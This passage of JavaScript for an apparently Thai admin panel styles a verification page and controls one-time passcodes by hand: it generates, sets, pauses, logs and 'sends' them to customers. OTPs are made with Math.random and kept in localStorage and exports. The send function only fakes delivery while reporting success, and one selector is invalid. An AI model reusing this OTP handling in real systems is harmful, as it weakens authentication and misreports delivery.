        'verificationContainerWidth', 'verificationContainerPadding', 'verificationBorderRadius',
        'verificationFontSizeTitle', 'verificationFontSizeHeading', 'verificationFontSizeCode',
        'verificationSpacingSections', 'verificationCodePadding'
    ];
    
    sizeInputs.forEach(id => {
        const slider = document.getElementById(id);
        if (slider) {
            const valueDisplay = slider.nextElementSibling;
            
            slider.addEventListener('input', function() {
                if (valueDisplay && valueDisplay.classList.contains('slider-value')) {
                    valueDisplay.textContent = this.value + 'px';
                }
            });
        }
    });
}

// Load verification settings on page load
function loadVerificationSettings() {
    const savedSettings = localStorage.getItem('verificationSettings');
    if (savedSettings) {
        const settings = JSON.parse(savedSettings);
        
        // Apply text settings
        if (settings.texts) {
            Object.keys(settings.texts).forEach(key => {
                const element = document.getElementById(key.replace('lineTitle', 'verificationTitle'));
                if (element) {
                    element.value = settings.texts[key];
                }
            });
        }
        
        // Apply color settings
        if (settings.colors) {
            Object.keys(settings.colors).forEach(key => {
                const elementId = 'verification' + key.split('-').map(word => 
                    word.charAt(0).toUpperCase() + word.slice(1)
                ).join('').replace('Bg', 'Bg');
                const element = document.getElementById(elementId);
                if (element) {
                    element.value = settings.colors[key];
                }
            });
        }
        
        // Apply size settings
        if (settings.sizes) {
            Object.keys(settings.sizes).forEach(key => {
                const elementId = 'verification' + key.split('-').map(word => 
                    word.charAt(0).toUpperCase() + word.slice(1)
                ).join('');
                const element = document.getElementById(elementId);
                if (element) {
                    element.value = settings.sizes[key];
                    const valueDisplay = element.nextElementSibling;
                    if (valueDisplay && valueDisplay.classList.contains('slider-value')) {
                        valueDisplay.textContent = settings.sizes[key] + 'px';
                    }
                }
            });
        }
        
        // Apply other settings
        if (settings.verificationCode) {
            const codeElement = document.getElementById('verificationCode');
            if (codeElement) codeElement.value = settings.verificationCode;
        }
        
        if (settings.timerMinutes) {
            const timerElement = document.getElementById('timerMinutes');
            if (timerElement) timerElement.value = settings.timerMinutes;
        }
        
        if (settings.alternativeUrl) {
            const urlElement = document.getElementById('alternativeUrl');
            if (urlElement) urlElement.value = settings.alternativeUrl;
        }
        
        // Update color input text fields
        updateVerificationColorInputs();
    }
}

// Enhanced initialization function
function initializeAdmin() {
    setupColorControls();
    setupTextControls();
    setupDividerControls();
    setupSizeControls();
    setupVerificationControls(); // Add verification controls
    
    loadColorSettings();
    loadTextSettings();
    loadDividerSettings();
    loadSizeSettings();
    loadVerificationSettings(); // Load verification settings
    
    console.log('Admin panel initialized with verification page support');
}

// Initialize admin panel when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    initializeAdmin();
});


// ==================== OTP MANUAL CONTROL FUNCTIONS ====================

// Global OTP state
let otpState = {
    currentCode: '6085',
    timeLeft: 170, // seconds
    isActive: true,
    isPaused: false,
    timerInterval: null,
    logs: []
};

// Generate new OTP
function generateNewOtp() {
    const length = parseInt(document.getElementById('defaultOtpLength').value) || 6;
    const duration = parseInt(document.getElementById('defaultOtpDuration').value) || 3;
    
    // Generate random OTP
    let newOtp = '';
    for (let i = 0; i < length; i++) {
        newOtp += Math.floor(Math.random() * 10);
    }
    
    // Update OTP state
    otpState.currentCode = newOtp;
    otpState.timeLeft = duration * 60;
    otpState.isActive = true;
    otpState.isPaused = false;
    
    // Update displays
    updateOtpDisplays();
    updateVerificationPage();
    
    // Log action
    logOtpAction('สร้าง OTP ใหม่', `รหัส: ${newOtp}, เวลา: ${duration} นาที`);
    
    // Show notification
    if (document.getElementById('showOtpNotification').checked) {
        showOtpMessage(`🆕 สร้าง OTP ใหม่: ${newOtp} (${duration} นาที)`, 'success');
    }
    
    // Restart timer
    startOtpTimer();
}

// Extend OTP time
function extendOtpTime() {
    if (!otpState.isActive) {
        showOtpMessage('❌ ไม่สามารถขยายเวลา OTP ที่หมดอายุแล้ว', 'error');
        return;
    }
    
    otpState.timeLeft += 60; // Add 1 minute
    updateOtpDisplays();
    updateVerificationPage();
    
    logOtpAction('ขยายเวลา OTP', '+1 นาที');
    
    if (document.getElementById('showOtpNotification').checked) {
        showOtpMessage('⏰ ขยายเวลา OTP +1 นาที', 'success');
    }
}

// Expire OTP immediately
function expireOtp() {
    if (confirm('คุณต้องการทำให้ OTP หมดอายุทันทีหรือไม่?')) {
        otpState.timeLeft = 0;
        otpState.isActive = false;
        otpState.isPaused = false;
        
        updateOtpDisplays();
        updateVerificationPage();
        stopOtpTimer();
        
        logOtpAction('ทำให้ OTP หมดอายุ', 'ทันที');
        
        if (document.getElementById('showOtpNotification').checked) {
            showOtpMessage('❌ OTP หมดอายุแล้ว', 'warning');
        }
        
        // Auto generate new OTP if enabled
        if (document.getElementById('autoGenerateOtp').checked) {
            setTimeout(() => {
                generateNewOtp();
            }, 2000);
        }
    }
}

// Pause timer
function pauseTimer() {
    if (!otpState.isActive) {
        showOtpMessage('❌ ไม่สามารถหยุดเวลา OTP ที่หมดอายุแล้ว', 'error');
        return;
    }
    
    otpState.isPaused = true;
    stopOtpTimer();
    updateOtpDisplays();
    
    // Toggle buttons
    document.getElementById('pauseBtn').style.display = 'none';
    document.getElementById('resumeBtn').style.display = 'block';
    
    logOtpAction('หยุดเวลา OTP', 'ชั่วคราว');
    
    if (document.getElementById('showOtpNotification').checked) {
        showOtpMessage('⏸️ หยุดเวลา OTP ชั่วคราว', 'warning');
    }
}

// Resume timer
function resumeTimer() {
    if (!otpState.isActive) {
        showOtpMessage('❌ ไม่สามารถเริ่มเวลา OTP ที่หมดอายุแล้ว', 'error');
        return;
    }
    
    otpState.isPaused = false;
    startOtpTimer();
    updateOtpDisplays();
    
    // Toggle buttons
    document.getElementById('pauseBtn').style.display = 'block';
    document.getElementById('resumeBtn').style.display = 'none';
    
    logOtpAction('เริ่มเวลา OTP', 'ต่อ');
    
    if (document.getElementById('showOtpNotification').checked) {
        showOtpMessage('▶️ เริ่มเวลา OTP ต่อ', 'success');
    }
}

// Reset timer
function resetTimer() {
    const duration = parseInt(document.getElementById('defaultOtpDuration').value) || 3;
    
    otpState.timeLeft = duration * 60;
    otpState.isActive = true;
    otpState.isPaused = false;
    
    updateOtpDisplays();
    updateVerificationPage();
    startOtpTimer();
    
    // Reset buttons
    document.getElementById('pauseBtn').style.display = 'block';
    document.getElementById('resumeBtn').style.display = 'none';
    
    logOtpAction('รีเซ็ตเวลา OTP', `${duration} นาที`);
    
    if (document.getElementById('showOtpNotification').checked) {
        showOtpMessage(`🔄 รีเซ็ตเวลา OTP เป็น ${duration} นาที`, 'success');
    }
}

// Set custom OTP
function setCustomOtp() {
    const customCode = document.getElementById('customOtpCode').value.trim();
    const customMinutes = parseInt(document.getElementById('customOtpMinutes').value) || 3;
    const customSeconds = parseInt(document.getElementById('customOtpSeconds').value) || 0;
    
    // Validate OTP code
    if (!customCode || !/^\d{4,6}$/.test(customCode)) {
        showOtpMessage('❌ กรุณาใส่รหัส OTP ที่ถูกต้อง (ตัวเลข 4-6 หลัก)', 'error');
        return;
    }
    
    // Update OTP state
    otpState.currentCode = customCode;
    otpState.timeLeft = (customMinutes * 60) + customSeconds;
    otpState.isActive = true;
    otpState.isPaused = false;
    
    updateOtpDisplays();
    updateVerificationPage();
    startOtpTimer();
    
    // Reset buttons
    document.getElementById('pauseBtn').style.display = 'block';
    document.getElementById('resumeBtn').style.display = 'none';
    
    logOtpAction('ตั้งค่า OTP แบบกำหนดเอง', `รหัส: ${customCode}, เวลา: ${customMinutes}:${customSeconds.toString().padStart(2, '0')}`);
    
    if (document.getElementById('showOtpNotification').checked) {
        showOtpMessage(`🎯 ตั้งค่า OTP: ${customCode} (${customMinutes}:${customSeconds.toString().padStart(2, '0')})`, 'success');
    }
    
    // Clear form
    document.getElementById('customOtpCode').value = '';
}

// Start OTP timer
function startOtpTimer() {
    stopOtpTimer(); // Clear existing timer
    
    otpState.timerInterval = setInterval(() => {
        if (otpState.isPaused || !otpState.isActive) return;
        
        otpState.timeLeft--;
        updateOtpDisplays();
        updateVerificationPage();
        
        if (otpState.timeLeft <= 0) {
            otpState.isActive = false;
            stopOtpTimer();
            
            logOtpAction('OTP หมดอายุ', 'อัตโนมัติ');
            
            if (document.getElementById('showOtpNotification').checked) {
                showOtpMessage('⏰ OTP หมดอายุแล้ว', 'warning');
            }
            
            // Auto generate new OTP if enabled
            if (document.getElementById('autoGenerateOtp').checked) {
                setTimeout(() => {
                    generateNewOtp();
                }, 2000);
            }
        }
    }, 1000);
}

// Stop OTP timer
function stopOtpTimer() {
    if (otpState.timerInterval) {
        clearInterval(otpState.timerInterval);
        otpState.timerInterval = null;
    }
}

// Update OTP displays in admin panel
function updateOtpDisplays() {
    // Update current OTP display
    const otpDisplay = document.getElementById('currentOtpDisplay');
    if (otpDisplay) {
        otpDisplay.textContent = otpState.currentCode;
    }
    
    // Update timer display
    const timerDisplay = document.getElementById('currentTimerDisplay');
    if (timerDisplay) {
        const minutes = Math.floor(otpState.timeLeft / 60);
        const seconds = otpState.timeLeft % 60;
        timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
    
    // Update status display
    const statusDisplay = document.getElementById('otpStatusDisplay');
    if (statusDisplay) {
        statusDisplay.className = 'status-display';
        
        if (!otpState.isActive) {
            statusDisplay.textContent = 'หมดอายุ';
            statusDisplay.classList.add('status-expired');
        } else if (otpState.isPaused) {
            statusDisplay.textContent = 'หยุดชั่วคราว';
            statusDisplay.classList.add('status-paused');
        } else {
            statusDisplay.textContent = 'ใช้งานได้';
            statusDisplay.classList.add('status-active');
        }
    }
}

// Update verification page with current OTP
function updateVerificationPage() {
    const previewFrame = document.getElementById('previewFrame');
    if (previewFrame && previewFrame.src.includes('verification.html')) {
        try {
            const verificationWindow = previewFrame.contentWindow;
            if (verificationWindow && verificationWindow.document) {
                // Update OTP code
                const codeDisplay = verificationWindow.document.getElementById('codeDisplay');
                if (codeDisplay) {
                    codeDisplay.textContent = otpState.currentCode;
                }
                
                // Update timer
                const countdown = verificationWindow.document.getElementById('countdown');
                if (countdown) {
                    const minutes = Math.floor(otpState.timeLeft / 60);
                    const seconds = otpState.timeLeft % 60;
                    countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }
                
                // Update timer display text
                const timerDisplay = verificationWindow.document.getElementById('timerDisplay');
                if (timerDisplay) {
                    if (otpState.timeLeft <= 0) {
                        timerDisplay.innerHTML = 'หมดเวลา <span style="color: #ff4444;">กรุณาขอรหัสใหม่</span>';
                    } else if (otpState.isPaused) {
                        timerDisplay.innerHTML = 'หยุดชั่วคราว <span id="countdown">' + 
                            `${Math.floor(otpState.timeLeft / 60).toString().padStart(2, '0')}:${(otpState.timeLeft % 60).toString().padStart(2, '0')}` + 
                            '</span>';
                    } else {
                        timerDisplay.innerHTML = 'เหลือเวลา <span id="countdown">' + 
                            `${Math.floor(otpState.timeLeft / 60).toString().padStart(2, '0')}:${(otpState.timeLeft % 60).toString().padStart(2, '0')}` + 
                            '</span>';
                    }
                }
            }
        } catch (error) {
            console.log('Cannot update verification page:', error);
        }
    }
}

// Show OTP message
function showOtpMessage(message, type = 'success') {
    // Remove existing messages
    const existingMessages = document.querySelectorAll('.otp-message');
    existingMessages.forEach(msg => msg.remove());
    
    // Create new message
    const messageDiv = document.createElement('div');
    messageDiv.className = `otp-message ${type}`;
    messageDiv.textContent = message;
    
    // Insert after OTP control section
    const otpSection = document.querySelector('h2:contains("🎛️")');
    if (otpSection && otpSection.parentNode) {
        otpSection.parentNode.insertBefore(messageDiv, otpSection.nextSibling);
    }
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        messageDiv.remove();
    }, 5000);
}

// Log OTP action
function logOtpAction(action, details) {
    const timestamp = new Date().toLocaleString('th-TH');
    const logEntry = {
        timestamp,
        action,
        details,
        otpCode: otpState.currentCode,
        timeLeft: otpState.timeLeft
    };
    
    otpState.logs.push(logEntry);
    
    // Keep only last 100 logs
    if (otpState.logs.length > 100) {
        otpState.logs = otpState.logs.slice(-100);
    }
    
    console.log('OTP Action:', logEntry);
}

// Save OTP settings
function saveOtpSettings() {
    const settings = {
        autoGenerate: document.getElementById('autoGenerateOtp').checked,
        showNotification: document.getElementById('showOtpNotification').checked,
        defaultLength: document.getElementById('defaultOtpLength').value,
        defaultDuration: document.getElementById('defaultOtpDuration').value,
        currentState: otpState
    };
    
    localStorage.setItem('otpSettings', JSON.stringify(settings));
    showOtpMessage('💾 บันทึกการตั้งค่า OTP แล้ว', 'success');
    
    logOtpAction('บันทึกการตั้งค่า', 'ทั้งหมด');
}

// Reset OTP settings
function resetOtpSettings() {
    if (confirm('คุณต้องการรีเซ็ตการตั้งค่า OTP ทั้งหมดหรือไม่?')) {
        // Reset form values
        document.getElementById('autoGenerateOtp').checked = true;
        document.getElementById('showOtpNotification').checked = true;
        document.getElementById('defaultOtpLength').value = '6';
        document.getElementById('defaultOtpDuration').value = '3';
        document.getElementById('customOtpCode').value = '';
        document.getElementById('customOtpMinutes').value = '3';
        document.getElementById('customOtpSeconds').value = '0';
        
        // Reset OTP state
        otpState = {
            currentCode: '6085',
            timeLeft: 170,
            isActive: true,
            isPaused: false,
            timerInterval: null,
            logs: []
        };
        
        updateOtpDisplays();
        updateVerificationPage();
        startOtpTimer();
        
        // Reset buttons
        document.getElementById('pauseBtn').style.display = 'block';
        document.getElementById('resumeBtn').style.display = 'none';
        
        localStorage.removeItem('otpSettings');
        showOtpMessage('🔄 รีเซ็ตการตั้งค่า OTP แล้ว', 'success');
        
        logOtpAction('รีเซ็ตการตั้งค่า', 'ทั้งหมด');
    }
}

// Export OTP logs
function exportOtpLogs() {
    if (otpState.logs.length === 0) {
        showOtpMessage('❌ ไม่มีบันทึก OTP ให้ส่งออก', 'error');
        return;
    }
    
    const csvContent = 'เวลา,การกระทำ,รายละเอียด,รหัส OTP,เวลาที่เหลือ\n' +
        otpState.logs.map(log => 
            `"${log.timestamp}","${log.action}","${log.details}","${log.otpCode}","${log.timeLeft}"`
        ).join('\n');
    
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    
    const link = document.createElement('a');
    link.href = url;
    link.download = `otp-logs-${new Date().toISOString().split('T')[0]}.csv`;
    link.click();
    
    URL.revokeObjectURL(url);
    showOtpMessage('📊 ส่งออกบันทึก OTP แล้ว', 'success');
    
    logOtpAction('ส่งออกบันทึก', `${otpState.logs.length} รายการ`);
}

// Load OTP settings
function loadOtpSettings() {
    const savedSettings = localStorage.getItem('otpSettings');
    if (savedSettings) {
        try {
            const settings = JSON.parse(savedSettings);
            
            // Apply settings to form
            if (settings.autoGenerate !== undefined) {
                document.getElementById('autoGenerateOtp').checked = settings.autoGenerate;
            }
            if (settings.showNotification !== undefined) {
                document.getElementById('showOtpNotification').checked = settings.showNotification;
            }
            if (settings.defaultLength) {
                document.getElementById('defaultOtpLength').value = settings.defaultLength;
            }
            if (settings.defaultDuration) {
                document.getElementById('defaultOtpDuration').value = settings.defaultDuration;
            }
            
            // Restore OTP state if available
            if (settings.currentState) {
                otpState = { ...otpState, ...settings.currentState };
                updateOtpDisplays();
            }
        } catch (error) {
            console.error('Error loading OTP settings:', error);
        }
    }
    
    // Start timer
    startOtpTimer();
}

// Setup OTP controls
function setupOtpControls() {
    // Add input validation for custom OTP
    const customOtpInput = document.getElementById('customOtpCode');
    if (customOtpInput) {
        customOtpInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    }
    
    // Load saved settings
    loadOtpSettings();
    
    console.log('OTP controls initialized');
}

// Update the main initialization function
function initializeAdmin() {
    setupColorControls();
    setupTextControls();
    setupDividerControls();
    setupSizeControls();
    setupVerificationControls();
    setupOtpControls(); // Add OTP controls
    
    loadColorSettings();
    loadTextSettings();
    loadDividerSettings();
    loadSizeSettings();
    loadVerificationSettings();
    
    console.log('Admin panel initialized with OTP control support');
}


// ฟังก์ชันส่ง OTP ให้ลูกค้า
function sendOtpToCustomer() {
    const customerContact = document.getElementById('customerContact').value.trim();
    const sendMethod = document.getElementById('sendMethod').value;
    const otpCode = otpState.currentCode;
    
    // ตรวจสอบข้อมูล
    if (!customerContact) {
        showSendStatus('❌ กรุณากรอกข้อมูลติดต่อลูกค้า', 'error');
        return;
    }
    
    if (!otpCode || !otpState.isActive) {
        showSendStatus('❌ ไม่มีรหัส OTP ที่ใช้งานได้ กรุณาสร้างรหัสใหม่', 'error');
        return;
    }
    
    // อัปเดตช่องรหัส OTP ที่จะส่ง
    document.getElementById('otpToSend').value = otpCode;
    
    // จำลองการส่ง OTP
    showSendStatus('📤 กำลังส่ง OTP...', 'info');
    
    setTimeout(() => {
        let message = '';
        let methodText = '';
        
        switch (sendMethod) {
            case 'sms':
                methodText = 'SMS';
                message = `✅ ส่ง OTP "${otpCode}" ทาง SMS ไปยัง ${customerContact} เรียบร้อยแล้ว`;
                break;
            case 'line':
                methodText = 'LINE';
                message = `✅ ส่ง OTP "${otpCode}" ทาง LINE ไปยัง ${customerContact} เรียบร้อยแล้ว`;
                break;
            case 'call':
                methodText = 'โทรศัพท์';
                message = `✅ แจ้ง OTP "${otpCode}" ทางโทรศัพท์ไปยัง ${customerContact} เรียบร้อยแล้ว`;
                break;
            case 'manual':
                methodText = 'ด้วยตนเอง';
                message = `✅ รหัส OTP "${otpCode}" พร้อมแจ้งลูกค้า ${customerContact} ด้วยตนเอง`;
                break;
        }
        
        showSendStatus(message, 'success');
        
        // บันทึกการส่ง
        logOtpAction('ส่ง OTP ให้ลูกค้า', `${methodText} - ${customerContact}`);
        
        // แสดงข้อความแจ้งเตือน
        if (document.getElementById('showOtpNotification').checked) {
            showOtpMessage(`📤 ส่ง OTP ทาง${methodText}แล้ว`, 'success');
        }
        
    }, 1500); // จำลองเวลาส่ง 1.5 วินาที
}

// ฟังก์ชันคัดลอกรหัส OTP
function copyOtpCode() {
    const otpCode = otpState.currentCode;
    
    if (!otpCode || !otpState.isActive) {
        showSendStatus('❌ ไม่มีรหัส OTP ที่ใช้งานได้', 'error');
        return;
    }
    
    // คัดลอกไปยัง clipboard
    navigator.clipboard.writeText(otpCode).then(() => {
        showSendStatus(`📋 คัดลอกรหัส "${otpCode}" แล้ว`, 'success');
        
        // อัปเดตช่องรหัส OTP ที่จะส่ง
        document.getElementById('otpToSend').value = otpCode;
        
        logOtpAction('คัดลอกรหัส OTP', otpCode);
        
    }).catch(() => {
        // Fallback สำหรับเบราว์เซอร์เก่า
        const textArea = document.createElement('textarea');
        textArea.value = otpCode;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        
        showSendStatus(`📋 คัดลอกรหัส "${otpCode}" แล้ว`, 'success');
        document.getElementById('otpToSend').value = otpCode;
        logOtpAction('คัดลอกรหัส OTP', otpCode);
    });
}

// ฟังก์ชันแสดงสถานะการส่ง
function showSendStatus(message, type) {
    const statusDiv = document.getElementById('sendStatus');
    const messageDiv = statusDiv.querySelector('.status-message');
    
    // แสดงสถานะ
    statusDiv.style.display = 'block';
    statusDiv.className = `send-status ${type}`;
    messageDiv.textContent = message;
    
    // ซ่อนหลังจาก 5 วินาที (ยกเว้นข้อผิดพลาด)
    if (type !== 'error') {
        setTimeout(() => {
            statusDiv.style.display = 'none';
        }, 5000);
    }
}

// ฟังก์ชันอัปเดตรหัส OTP ที่จะส่ง
function updateOtpToSend() {
    const otpToSendInput = document.getElementById('otpToSend');
    if (otpToSendInput) {
        otpToSendInput.value = otpState.currentCode;
        otpToSendInput.placeholder = otpState.isActive ? 
            `รหัสปัจจุบัน: ${otpState.currentCode}` : 
            'ไม่มีรหัส OTP ที่ใช้งานได้';
    }
}

// อัปเดตฟังก์ชัน updateOtpDisplays เพื่อรวมการอัปเดตรหัสที่จะส่ง
const originalUpdateOtpDisplays = updateOtpDisplays;
updateOtpDisplays = function() {
    originalUpdateOtpDisplays();
    updateOtpToSend();
};

// เพิ่มการตั้งค่าเริ่มต้นเมื่อโหลดหน้า
document.addEventListener('DOMContentLoaded', function() {
    // ตั้งค่าเริ่มต้นสำหรับรหัส OTP ที่จะส่ง
    setTimeout(() => {
        updateOtpToSend();
    }, 100);
});

